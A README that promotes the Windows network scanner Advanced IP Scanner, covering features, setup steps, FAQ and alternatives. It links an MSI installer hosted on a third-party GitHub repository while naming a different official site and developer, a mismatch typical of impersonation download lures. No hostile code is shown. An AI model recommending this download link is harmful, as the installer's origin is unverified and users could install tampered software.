# Advanced IP Scanner — Free Network Scanner for Windows

Discover every device on your LAN in seconds.  
**Fast, portable, and free** — scan IP ranges, identify hosts, and manage remote PCs without cloud uploads.

[![Latest Release](https://img.shields.io/github/v/release/netscan-tools/advanced-ip-scanner?label=Download&style=flat-square)](https://github.com/netscan-tools/advanced-ip-scanner/releases/latest)
[![Windows](https://img.shields.io/badge/Windows-7%20%7C%208%20%7C%2010%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)](https://github.com/netscan-tools/advanced-ip-scanner/releases/latest)
[![License](https://img.shields.io/badge/License-Free-green?style=flat-square)](https://github.com/netscan-tools/advanced-ip-scanner)
[![MSI](https://img.shields.io/badge/Installer-MSI-blue?style=flat-square)](https://github.com/netscan-tools/advanced-ip-scanner/releases/latest)

---

## Download

| Platform | Installer |
|----------|-----------|
| Windows 7 / 8 / 10 / 11 (32-bit & 64-bit) | [**Advanced_IP_Scanner_2.5.4594.1.msi**](https://github.com/netscan-tools/advanced-ip-scanner/releases/download/Advanced_IP_Scanner_2.5.4594.1/Advanced_IP_Scanner_2.5.4594.1.msi) |

> **Free** for personal and commercial use. No registration required.

---

## What it does

**Advanced IP Scanner** is a free, fast, and portable **network scanner for Windows**. It scans local area networks (LAN) to detect all connected devices and retrieve IP addresses, MAC addresses, hostnames, and shared resources.

Ideal for:

- network administrators inventorying office LANs
- IT technicians troubleshooting connectivity and IP conflicts
- sysadmins managing remote desktops and shared folders
- home users checking which devices are on their Wi‑Fi router

---

## Features

- **Fast LAN scanning** — discover all devices on your network within seconds across any specified IP range
- **Remote access to shared folders** — browse shared resources including FTP, HTTP, and HTTPS services directly from scan results
- **Device identification** — detect MAC address, hardware vendor, hostname, and operating system information for each device
- **Remote power management** — send Wake-on-LAN, shutdown, and restart commands to networked PCs
- **Remote desktop integration** — launch RDP or Radmin sessions to any discovered device
- **Portable mode** — run without installation from a USB drive or any directory
- **Favorites list** — save frequently accessed devices for quick targeted scans
- **Export results** — save scan reports in CSV format for documentation and auditing

---

## Screenshots

| Main window | Scan results |
|-------------|--------------|
| `docs/screenshots/main.png` | `docs/screenshots/results.png` |

---

## Quick start

### Scan a single IP address

1. Paste the target IP address into the entry field at the top of the window.
2. Click **Scan**.
3. Review returned information: MAC address, hostname, vendor, open ports, and response status.

### Scan multiple IP addresses

1. Prepare a plaintext file with one IP address or IP range per line.
2. Import the file into Advanced IP Scanner.
3. Start the scan — the tool generates a detailed report for each entry.

### Use favorites for targeted scans

1. Mark specific devices as favorites.
2. Run targeted scans on a subset of machines instead of the entire network.
3. Save time when monitoring specific endpoints or servers.

### First-time setup

1. Download [**Advanced_IP_Scanner_2.5.4594.1.msi**](https://github.com/netscan-tools/advanced-ip-scanner/releases/download/Advanced_IP_Scanner_2.5.4594.1/Advanced_IP_Scanner_2.5.4594.1.msi) from [Releases](https://github.com/netscan-tools/advanced-ip-scanner/releases/latest).
2. Run the MSI installer (standard Windows setup, uninstall via Settings).
3. Open **Advanced IP Scanner**.
4. Enter an IP range (e.g. `192.168.1.1–255`) or a single IP.
5. Click **Scan** → review results → export to CSV if needed.

---

## Remote control and administration

When paired with remote administration tools such as **Radmin** or Windows **Remote Desktop Protocol (RDP)**, Advanced IP Scanner enables:

- initiating remote desktop sessions directly from scan results
- sending shutdown, restart, and Wake-on-LAN commands to networked computers
- browsing shared folders, documents, images, and media on remote machines
- accessing FTP and HTTP services discovered during the scan

Because the program supports **portable mode**, these capabilities are available from any Windows computer without a full install.

---

## System requirements

| Requirement | Details |
|-------------|---------|
| OS | Windows 7 / 8 / 10 / 11 (32-bit and 64-bit) |
| Price | Free |
| Languages | Multiple languages supported |
| Installation | MSI installer (GPO / SCCM / Intune friendly) |
| Network | Local LAN / Wi‑Fi access |
| Disk | ~20 MB |

---

## Use cases

- **Network inventory** — quickly catalog all devices connected to your LAN
- **Troubleshooting** — identify IP conflicts, unreachable hosts, and unauthorized devices
- **IT administration** — manage remote desktops, shared folders, and power states across the network
- **Security auditing** — detect unknown devices and open services on your network
- **Home networking** — see what devices are connected to your router

---

## FAQ

**Is Advanced IP Scanner really free?**  
Yes. Free for personal and commercial use.

**Does it require internet?**  
No. Scanning runs locally on your LAN. Internet is only needed to download the installer.

**Can I run it without installing?**  
Yes. Portable mode works from a USB drive or any folder.

**Does it work on Wi‑Fi networks?**  
Yes. It scans any reachable IP range on your local network.

**Can I export scan results?**  
Yes. Export to CSV for reports and auditing.

**What remote tools does it integrate with?**  
RDP (Remote Desktop) and Radmin for remote sessions; Wake-on-LAN for power management.

**Why MSI instead of EXE?**  
MSI integrates with corporate deployment (GPO / SCCM / Intune) and standard uninstall via Windows Settings.

**Why use this instead of Angry IP Scanner or Nmap?**  
Advanced IP Scanner is Windows-focused, GUI-first, and includes built-in remote admin hooks — ideal for quick LAN discovery without a command line.

---

## Alternatives

If you are looking for similar **network scanning tools**, consider:

| Tool | Best for |
|------|----------|
| **Fing** | Mobile and desktop scanner with device recognition |
| **Angry IP Scanner** | Open-source cross-platform IP and port scanner |
| **Bopup Scanner** | Lightweight scanner for Windows environments |
| **Wireless Network Scanner** | Wi‑Fi–focused network discovery |
| **Nmap** | Advanced network exploration and security auditing |
| **SoftPerfect Network Scanner** | Multi-protocol scanner with advanced features |

---

## Summary

**Advanced IP Scanner** is a practical, efficient, and free tool for anyone who needs to discover, inventory, and interact with devices on a local network. Its portability, straightforward interface, and seamless integration with remote-control utilities make it an essential addition to any network troubleshooting toolkit.

---

## Support

- [Releases](https://github.com/netscan-tools/advanced-ip-scanner/releases)
- [Issues](https://github.com/netscan-tools/advanced-ip-scanner/issues)
- Official site: [advanced-ip-scanner.com](https://www.advanced-ip-scanner.com/)
- Developer: Famatech Corp.
